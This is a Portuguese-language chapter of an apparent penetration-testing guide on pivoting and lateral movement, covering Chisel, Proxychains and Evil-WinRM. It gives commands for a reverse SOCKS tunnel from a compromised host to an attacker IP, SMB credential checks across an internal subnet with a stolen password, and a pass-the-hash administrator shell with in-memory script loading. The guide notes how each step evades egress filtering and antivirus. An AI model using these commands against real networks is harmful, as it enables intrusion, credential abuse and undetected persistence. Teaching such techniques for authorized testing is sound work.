---
description: "Ferramentas para pivoting, tunelamento, movimentação lateral e acesso remoto em ambientes autorizados."
---

# 7. Movimentação Lateral e Persistência

Com privilégios elevados estabelecidos em um ponto de apoio (*foothold*), esta fase concentra-se em expandir o alcance do comprometimento através de segmentos de rede internos inacessíveis diretamente, bem como em garantir mecanismos de acesso remoto duradouros. O foco técnico recai sobre o tunelamento de tráfego, o roteamento de ferramentas ofensivas através de hosts pivô e o estabelecimento de canais de acesso persistentes.

## 7.1 Chisel — v1.11.8

* **Descrição Acadêmica/Técnica:** O Chisel é uma ferramenta de tunelamento TCP/UDP rápida, desenvolvida em Go e compilada como um binário estático único (sem dependências externas), projetada para estabelecer túneis criptografados sobre HTTP/WebSocket entre um cliente e um servidor. Em baixo nível, a ferramenta opera em uma arquitetura cliente-servidor: uma instância atua como servidor (tipicamente na máquina do atacante, expondo uma porta de escuta), enquanto a outra atua como cliente (executada no *host* pivô comprometido), estabelecendo uma conexão *outbound* multiplexada sobre uma única sessão SSH encapsulada dentro de WebSocket. Essa característica é criticamente relevante em ambientes corporativos, pois o tráfego de tunelamento se assemelha a tráfego HTTP/HTTPS legítimo, contornando *firewalls* de saída (*egress filtering*) que tipicamente bloqueiam apenas portas não convencionais, ao mesmo tempo em que multiplexa múltiplos túneis lógicos (*forward* e *reverse*) sobre essa única conexão física.
* **Principais Funcionalidades:**
  * Tunelamento reverso (*reverse tunneling*) que permite acesso a serviços internos de uma rede segmentada a partir de uma máquina externa, mesmo sem IP público na máquina pivô.
  * Tunelamento direto (*forward tunneling*) para redirecionamento de portas locais até um serviço remoto interno.
  * Multiplexação de múltiplos túneis simultâneos sobre uma única conexão TCP, reduzindo a superfície de detecção.
  * Encapsulamento de tráfego sobre HTTP/WebSocket, dificultando a distinção em relação a tráfego web legítimo por *firewalls* de aplicação.
  * Suporte nativo a criação de um *SOCKS5 proxy* diretamente através do túnel estabelecido, viabilizando o roteamento de outras ferramentas.

**Sintaxe e Comandos Principais:**

```bash
# Inicialização do servidor Chisel na máquina atacante (com suporte a criação de proxy SOCKS5 pelo cliente)

chisel server -p [porta_de_escuta] --reverse

# Conexão do cliente (executado no host pivô comprometido) estabelecendo um proxy SOCKS5 reverso

chisel client [IP_atacante]:[porta_de_escuta] R:socks

# Tunelamento direto (forward) de uma porta interna específica de um segundo host para a máquina atacante

chisel client [IP_atacante]:[porta_de_escuta] [porta_local]:[IP_interno]:[porta_remota]
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após comprometer um servidor *web* (10.0.5.10) que atua como ponte entre a DMZ e a rede interna corporativa (192.168.20.0/24), o analista precisa rotear o tráfego de ferramentas como Nmap e o próprio NetExec através dessa máquina pivô para varrer a rede interna, à qual não possui rota direta a partir de sua estação de ataque externa.
- **Comandos Executados:**

```bash
chisel server -p 8000 --reverse

chisel client 203.0.113.50:8000 R:socks
```

- **Resultado Esperado:** Após a execução do cliente no *host* pivô, o servidor Chisel na máquina atacante abrirá localmente um *proxy* SOCKS5 (padrão: 127.0.0.1:1080). Configurando esse *proxy* no arquivo /etc/proxychains4.conf, o analista poderá rotear qualquer ferramenta de linha de comando através do túnel reverso estabelecido, alcançando efetivamente a sub-rede interna 192.168.20.0/24 como se estivesse fisicamente conectado a ela.

## 7.2 Proxychains — v4.17 (proxychains-ng)

* **Descrição Acadêmica/Técnica:** O Proxychains é um utilitário que força o redirecionamento (*hijacking*) das chamadas de rede de qualquer aplicação para uma cadeia de *proxies* configurados (SOCKS4, SOCKS5 ou HTTP), sem exigir que a aplicação alvo possua suporte nativo a *proxy*. Em baixo nível, a ferramenta opera através da técnica de *interceptação dinâmica de biblioteca* (*LD_PRELOAD* em sistemas Linux), injetando sua própria biblioteca compartilhada (libproxychains) antes da execução do programa. Essa biblioteca sobrescreve (*hook*) as chamadas de sistema padrão de rede (como connect()), redirecionando de forma transparente todo o tráfego TCP originalmente destinado a um socket direto através da cadeia de *proxies* definida no arquivo de configuração, permitindo o uso irrestrito de ferramentas como Nmap ou NetExec através de túneis previamente estabelecidos (ex: via Chisel ou SSH).
* **Principais Funcionalidades:**
  * Redirecionamento transparente e forçado do tráfego de rede de qualquer binário através de um ou mais *proxies*, sem necessidade de suporte nativo da aplicação.
  * Suporte ao encadeamento de múltiplos *proxies* em sequência (*proxy chaining*), aumentando o anonimato e a complexidade de rastreamento.
  * Três modos operacionais de encadeamento: *dynamic_chain* (ignora proxies mortos), *strict_chain* (exige que todos estejam ativos, na ordem definida) e *random_chain*.
  * Integração direta com *proxies* SOCKS5 gerados por outras ferramentas de tunelamento (Chisel, SSH -D, Ligolo-ng).

**Sintaxe e Comandos Principais:**

```bash
# Edição do arquivo de configuração para adicionar o proxy SOCKS5 estabelecido (ex: via túnel Chisel/SSH)

nano /etc/proxychains4.conf

# Adicionar ao final do arquivo: socks5 127.0.0.1 1080

# Execução de qualquer comando/ferramenta roteando seu tráfego através da cadeia de proxies configurada

proxychains [comando_e_argumentos_da_ferramenta]

# Exemplo de varredura de portas roteada através do proxy, contra a rede interna alcançada via pivot

proxychains nmap -sT -Pn [bloco_IP_interno_ou_CIDR]
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Com o túnel SOCKS5 reverso já estabelecido no [exemplo do Chisel](#71-chisel), o analista precisa efetivamente utilizar o NetExec para validar as credenciais de domínio previamente comprometidas contra os servidores da sub-rede interna 192.168.20.0/24, tarefa impossível sem o redirecionamento forçado do tráfego dessas ferramentas através do túnel.
- **Comando Executado:**

```bash
proxychains nxc smb 192.168.20.0/24 -u joao.silva -p 'Senha@2024'
```

- **Resultado Esperado:** O Proxychains interceptará todas as chamadas de conexão TCP realizadas pelo NetExec, redirecionando-as através do *proxy* SOCKS5 estabelecido pelo Chisel na porta 1080 local. O terminal exibirá o *log* de cada conexão sendo roteada pela cadeia (S-chain), seguido dos resultados normais do NetExec, agora referentes a *hosts* da rede interna que, sem o tunelamento, seriam completamente inacessíveis pela máquina do analista.

## 7.3 Evil-WinRM — v3.9

* **Descrição Acadêmica/Técnica:** O Evil-WinRM é um cliente ofensivo em Ruby para o protocolo *Windows Remote Management* (WinRM), que implementa o padrão WS-Management sobre HTTP/HTTPS (portas 5985/5986) para estabelecer sessões de *shell* remota interativa e completa em sistemas Windows, análoga a uma sessão PowerShell legítima e nativa do sistema operacional alvo. Em baixo nível, a ferramenta autentica-se via NTLM ou Kerberos (com suporte nativo a *hashes* NTLM para *Pass-the-Hash*, eliminando a necessidade de senha em texto claro) e, uma vez estabelecida a sessão, opera como um cliente WinRM completo, permitindo não apenas a execução de comandos remotos, mas também a carga dinâmica de *scripts* e módulos PowerShell diretamente na memória do processo remoto (*in-memory loading*), evitando a gravação de artefatos maliciosos em disco e a consequente detecção por soluções de *antivírus* baseadas em assinatura de arquivo.
* **Principais Funcionalidades:**
  * Estabelecimento de sessão *shell* interativa completa via WinRM, com suporte a autoconclusão de comandos e histórico.
  * Autenticação flexível via senha em texto claro, *hash* NTLM (*Pass-the-Hash*) ou certificados Kerberos.
  * Carregamento de *scripts* e módulos PowerShell (.ps1) diretamente na memória da sessão remota, sem necessidade de transferência prévia para o disco do alvo.
  * Upload e download nativo de arquivos entre a máquina atacante e o alvo através da própria sessão estabelecida.
  * Execução de comandos com bypass implícito de políticas restritivas de execução de *scripts* do PowerShell local.

**Sintaxe e Comandos Principais:**

```bash
# Conexão autenticada via senha em texto claro

evil-winrm -i [IP_do_alvo] -u [usuario] -p [senha]

# Conexão autenticada via hash NTLM (Pass-the-Hash), sem necessidade da senha em texto claro

evil-winrm -i [IP_do_alvo] -u [usuario] -H [hash_ntlm]

# Conexão especificando um diretório local para facilitar o upload/download de scripts e ferramentas

evil-winrm -i [IP_do_alvo] -u [usuario] -p [senha] -s [diretorio_local_de_scripts]

# Dentro da sessão: carregamento de um script PowerShell diretamente em memória

menu
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após extrair um *hash* NTLM de um administrador local através do NetExec (--sam) em um servidor Windows específico (10.0.5.40), o analista precisa estabelecer uma sessão interativa completa nesse *host* para realizar tarefas de pós-exploração mais elaboradas, como o carregamento em memória de um *script* PowerShell de enumeração adicional, sem jamais ter conhecido a senha original da conta.
- **Comandos Executados:**

```bash
evil-winrm -i 10.0.5.40 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -s /opt/scripts_powershell

menu
```

- **Resultado Esperado:** A ferramenta autenticará com sucesso via *Pass-the-Hash*, estabelecendo um *prompt* interativo (*Evil-WinRM* PS C:\\Users\\administrador\\Documents>) equivalente a uma sessão PowerShell nativa com privilégios administrativos completos. O comando menu carregará os *scripts* PowerShell presentes no diretório local mapeado (/opt/scripts_powershell) diretamente na memória da sessão remota, disponibilizando novas funções customizadas sem deixar qualquer arquivo gravado no disco do sistema comprometido.
